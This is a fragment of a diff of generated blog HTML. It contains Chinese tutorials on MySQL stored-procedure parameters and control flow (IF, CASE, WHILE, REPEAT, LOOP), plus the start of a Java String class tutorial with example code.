class="line">​    <span class="keyword">declare</span> score <span class="type">int</span> <span class="keyword">default</span> <span class="number">58</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> <span class="keyword">result</span> <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    if score <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;优秀&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    elseif score <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;及格&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">​       <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;不及格&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> <span class="keyword">result</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">end</span>; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p3();</span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<p>1). 介绍 </p>
+<p>参数的类型，主要分为以下三种：IN、OUT、INOUT。 具体的含义如下：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>含义</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IN</td>
+<td>该类参数作为输入</td>
+<td>需要调用时传入值</td>
+</tr>
+<tr>
+<td>OUT</td>
+<td>该类参数作为输出</td>
+<td>可以作为返回值</td>
+</tr>
+<tr>
+<td>INOUT</td>
+<td>既可以作为输入参数，也可以作为输出参数</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">PROCEDURE</span>  存储过程名称 ([ <span class="keyword">IN</span><span class="operator">/</span><span class="keyword">OUT</span><span class="operator">/</span><span class="keyword">INOUT</span>  参数名  参数类型 ]) </span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"></span><br><span class="line">​    <span class="comment">-- SQL语句 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>2). 案例一 </p>
+<p>根据传入参数score，判定当前分数对应的分数等级，并返回。 </p>
+<p> score &gt;&#x3D; 85分，等级为优秀。 </p>
+<p>score &gt;&#x3D; 60分 且 score &lt; 85分，等级为及格。 </p>
+<p>score &lt; 60分，等级为不及格。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p4(<span class="keyword">in</span> score <span class="type">int</span>, <span class="keyword">out</span> <span class="keyword">result</span> <span class="type">varchar</span>(<span class="number">10</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    if score <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;优秀&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    elseif score <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"> 		<span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;及格&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;不及格&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 定义用户变量 @result来接收返回的数据, 用户变量可以不用声明 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p4(<span class="number">18</span>, <span class="variable">@result</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@result</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="case"><a href="#case" class="headerlink" title="case"></a>case</h1><p>1). 介绍 </p>
+<p>case结构及作用，和我们在基础篇中所讲解的流程控制函数很类似。有两种语法格式： </p>
+<p>语法1：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 含义： 当case_value的值为 when_value1时，执行statement_list1，当值为 when_value2时， 执行statement_list2， 否则就执行 statement_list </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CASE</span>  case_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">WHEN</span>  when_value1  <span class="keyword">THEN</span>  statement_list1</span><br><span class="line"></span><br><span class="line">   [ <span class="keyword">WHEN</span>  when_value2  <span class="keyword">THEN</span>  statement_list2] ...</span><br><span class="line"></span><br><span class="line">   [ <span class="keyword">ELSE</span>  statement_list ] </span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span>  <span class="keyword">CASE</span>;</span><br></pre></td></tr></table></figure>
+
+<p>语法2：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 含义： 当条件search_condition1成立时，执行statement_list1，当条件search_condition2成 立时，执行statement_list2， 否则就执行 statement_list </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CASE</span>  </span><br><span class="line"></span><br><span class="line">   <span class="keyword">WHEN</span>  search_condition1  <span class="keyword">THEN</span>  statement_list1</span><br><span class="line"></span><br><span class="line">  [<span class="keyword">WHEN</span>  search_condition2  <span class="keyword">THEN</span>  statement_list2] ...</span><br><span class="line"></span><br><span class="line">  [<span class="keyword">ELSE</span>  statement_list]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br></pre></td></tr></table></figure>
+
+<p>案例 </p>
+<p>根据传入的月份，判定月份所属的季节（要求采用case结构）。 </p>
+<p>1-3月份，为第一季度 </p>
+<p>4-6月份，为第二季度 </p>
+<p>7-9月份，为第三季度 </p>
+<p>10-12月份，为第四季度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">procedure</span> p6(<span class="keyword">in</span> <span class="keyword">month</span> <span class="type">int</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> <span class="keyword">result</span> <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">case</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">when</span> <span class="keyword">month</span> <span class="operator">&gt;=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">month</span> <span class="operator">&lt;=</span> <span class="number">3</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​            <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;第一季度&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">when</span> <span class="keyword">month</span> <span class="operator">&gt;=</span> <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">month</span> <span class="operator">&lt;=</span> <span class="number">6</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​            <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;第二季度&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">when</span> <span class="keyword">month</span> <span class="operator">&gt;=</span> <span class="number">7</span> <span class="keyword">and</span> <span class="keyword">month</span> <span class="operator">&lt;=</span> <span class="number">9</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​            <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;第三季度&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​		<span class="keyword">when</span> <span class="keyword">month</span> <span class="operator">&gt;=</span> <span class="number">10</span> <span class="keyword">and</span> <span class="keyword">month</span> <span class="operator">&lt;=</span> <span class="number">12</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​            <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;第四季度&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">​            <span class="keyword">set</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="string">&#x27;非法参数&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">end</span> <span class="keyword">case</span> ;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> concat(<span class="string">&#x27;您输入的月份为: &#x27;</span>,<span class="keyword">month</span>, <span class="string">&#x27;, 所属的季度为: &#x27;</span>,<span class="keyword">result</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span>  p6(<span class="number">16</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><p>1). 介绍 </p>
+<p>while 循环是有条件的循环控制语句。满足条件后，再执行循环体中的SQL语句。具体语法为：</p>
+<p>– 先判定条件，如果条件为true，则执行逻辑，否则，不执行逻辑 </p>
+<p>WHILE  条件  DO</p>
+<p>​    SQL逻辑…</p>
+<p>END WHILE; 1 2 3 </p>
+<p>2). 案例 计算从1累加到n的值，n为传入的参数值。       </p>
+<p>– A. 定义局部变量, 记录累加之后的值;</p>
+<p>– B. 每循环一次, 就会对n进行减1 , 如果n减到0, 则退出循环 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p7(<span class="keyword">in</span> n <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> total <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">​       while n<span class="operator">&gt;</span><span class="number">0</span> do</span><br><span class="line"></span><br><span class="line">​			<span class="keyword">set</span> total :<span class="operator">=</span> total <span class="operator">+</span> n;</span><br><span class="line"></span><br><span class="line">​			<span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">​    	<span class="keyword">end</span> while;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p7(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="repeat"><a href="#repeat" class="headerlink" title="repeat"></a>repeat</h1><p>1). 介绍</p>
+<p>repeat是有条件的循环控制语句, 当满足until声明的条件的时候，则退出循环 。具体语法为：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 先执行一次逻辑，然后判定UNTIL条件是否满足，如果满足，则退出。如果不满足，则继续下一次循环 </span></span><br><span class="line"></span><br><span class="line">REPEAT</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">SQL</span>逻辑...</span><br><span class="line"></span><br><span class="line">​    UNTIL  条件 </span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span> REPEAT;</span><br></pre></td></tr></table></figure>
+
+<p>2). 案例</p>
+<p>计算从1累加到n的值，n为传入的参数值。(使用repeat实现)         </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- A. 定义局部变量, 记录累加之后的值;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- B. 每循环一次, 就会对n进行-1 , 如果n减到0, 则退出循环 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p8(<span class="keyword">in</span> n <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> total <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">​    repeat</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> total :<span class="operator">=</span> total <span class="operator">+</span> n;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">​    until  n <span class="operator">&lt;=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">end</span> repeat;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p8(<span class="number">10</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p8(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h1><p>1). 介绍</p>
+<p>LOOP 实现简单的循环，如果不在SQL逻辑中增加退出循环的条件，可以用其来实现简单的死循环。 LOOP可以配合一下两个语句使用： </p>
+<p>LEAVE ：配合循环使用，退出循环。 </p>
+<p>ITERATE：必须用在循环中，作用是跳过当前循环剩下的语句，直接进入下一次循环。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:]  LOOP</span><br><span class="line"></span><br><span class="line">   <span class="keyword">SQL</span>逻辑...</span><br><span class="line"></span><br><span class="line">   <span class="keyword">END</span>  LOOP  [end_label]; </span><br><span class="line"></span><br><span class="line">LEAVE  label;   <span class="comment">-- 退出指定标记的循环体 </span></span><br><span class="line"></span><br><span class="line">ITERATE  label; <span class="comment">-- 直接进入下一次循环</span></span><br></pre></td></tr></table></figure>
+
+<p>上述语法中出现的 begin_label，end_label，label 指的都是我们所自定义的标记。</p>
+<p>2).案例一 </p>
+<p>计算从1累加到n的值，n为传入的参数值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- A. 定义局部变量, 记录累加之后的值;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- B. 每循环一次, 就会对n进行-1 , 如果n减到0, 则退出循环 ----&gt; leave xx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p9(<span class="keyword">in</span> n <span class="type">int</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> total <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">​    sum:loop</span><br><span class="line"></span><br><span class="line">​        if n<span class="operator">&lt;=</span><span class="number">0</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">​            leave sum;</span><br><span class="line"></span><br><span class="line">​			<span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">​			 <span class="keyword">set</span> total :<span class="operator">=</span> total <span class="operator">+</span> n;</span><br><span class="line"></span><br><span class="line">​			 <span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">​		<span class="keyword">end</span> loop sum; </span><br><span class="line"></span><br><span class="line">​		<span class="keyword">select</span> total;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p9(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 3). 案例二 end if; set total :&#x3D; total + n; set n :&#x3D; n - 1; end loop sum; select total; end; call p9(100); </p>
+<p>计算从1到n之间的偶数累加的值，n为传入的参数值。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- A. 定义局部变量, 记录累加之后的值;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- B. 每循环一次, 就会对n进行-1 , 如果n减到0, 则退出循环 ----&gt; leave xx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- C. 如果当次累加的数据是奇数, 则直接进入下一次循环. --------&gt; iterate xx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p10(<span class="keyword">in</span> n <span class="type">int</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span> </span><br><span class="line"></span><br><span class="line">	<span class="keyword">declare</span> total <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>; </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	sum:loop</span><br><span class="line"></span><br><span class="line"> 		if n<span class="operator">&lt;=</span><span class="number">0</span> <span class="keyword">then</span> </span><br><span class="line"></span><br><span class="line">		leave sum; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span> if; </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	if n<span class="operator">%</span><span class="number">2</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">	</span><br><span class="line">    	<span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>; </span><br><span class="line">    </span><br><span class="line">    	iterate sum; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span> if; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">set</span> total :<span class="operator">=</span> total <span class="operator">+</span> n; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> loop sum; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> total; </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p10(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-java"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/java/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.172Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><h3 id="1String类概述"><a href="#1String类概述" class="headerlink" title="1String类概述"></a>1String类概述</h3><p>​	String 类代表字符串，Java 程序中的所有字符串文字（例如“abc”）都被实现为此类的实例。也就是说，Java 程序中所有的双引号字符串，都是 String 类的对象。String 类在 java.lang 包下，所以使用的时候不需要导包！</p>
+<h3 id="2String类的特点"><a href="#2String类的特点" class="headerlink" title="2String类的特点"></a>2String类的特点</h3><ul>
+<li>字符串不可变，它们的值在创建后不能被更改</li>
+<li>虽然 String 的值是不可变的，但是它们可以被共享</li>
+<li>字符串效果上相当于字符数组( char[] )，但是底层原理是字节数组( byte[] )</li>
+</ul>
+<h3 id="3String类的构造方法"><a href="#3String类的构造方法" class="headerlink" title="3String类的构造方法"></a>3String类的构造方法</h3><ul>
+<li><p>常用的构造方法</p>
+<table>
+<thead>
+<tr>
+<th>方法名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>public   String()</td>
+<td>创建一个空白字符串对象，不含有任何内容</td>
+</tr>
+<tr>
+<td>public   String(char[] chs)</td>
+<td>根据字符数组的内容，来创建字符串对象</td>
+</tr>
+<tr>
+<td>public   String(byte[] bys)</td>
+<td>根据字节数组的内容，来创建字符串对象</td>
+</tr>
+<tr>
+<td>String s &#x3D;   “abc”;</td>
+<td>直接赋值的方式创建字符串对象，内容就是abc</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>示例代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//public String()：创建一个空白字符串对象，不含有任何内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;s1:&quot;</span> + s1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public String(char[] chs)：根据字符数组的内容，来创建字符串对象</span></span><br><span class="line">        <span class="type">char</span>[] chs = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line">        System.out.println(<span class="string">&quot;s2:&quot;</span> + s2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public String(byte[] bys)：根据字节数组的内容，来创建字符串对象</span></span><br><span class="line">        <span class="type">byte</span>[] bys = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bys);</span><br><span class="line">        System.out.println(<span class="string">&quot;s3:&quot;</span> + s3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//String s = “abc”;	直接赋值的方式创建字符串对象，内容就是abc</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;s4:&quot;</span> + s4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="4创建字符串对象两种方式的区别"><a href="#4创建字符串对象两种方式的区别" class="headerlink" title="4创建字符串对象两种方式的区别"></a>4创建字符串对象两种方式的区别</h3><ul>
+<li><p>通过构造方法创建</p>
+<p>​	通过 new 创建的字符串对象，每一次 new 都会申请一个内存空间，虽然内容相同，但是地址值不同</p>
+</li>
+<li><p>直接赋值方式创建</p>
+<p>​	以“”方式给出的字符串，只要字符序列相同(顺序和大小写)，无论在程序代码中出现几次，JVM 都只会建立一个 String 对象，并在字符串池中维护</p>
+</li>
+</ul>
+<h3 id="5字符串的比较"><a href="#5字符串的比较" class="headerlink" title="5字符串的比较"></a>5字符串的比较</h3><h4 id="5-1-号的作用"><a href="#5-1-号的作用" class="headerlink" title="5.1  &#x3D;&#x3D;号的作用"></a>5.1  &#x3D;&#x3D;号的作用</h4><ul>
+<li>比较基本数据类型：比较的是具体的值</li>
+<li>比较引用数据类型：比较的是对象地址值</li>
+</ul>
+<h4 id="5-2-equals方法的作用"><a href="#5-2-equals方法的作用" class="headerlink" title="5.2  equals方法的作用"></a>5.2  equals方法的作用</h4><ul>
+<li><p>方法介绍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(String s)</span>     <span class="comment">//比较两个字符串内容是否相同、区分大小写</span></span><br></pre></td></tr></table></figure>
+
+
+
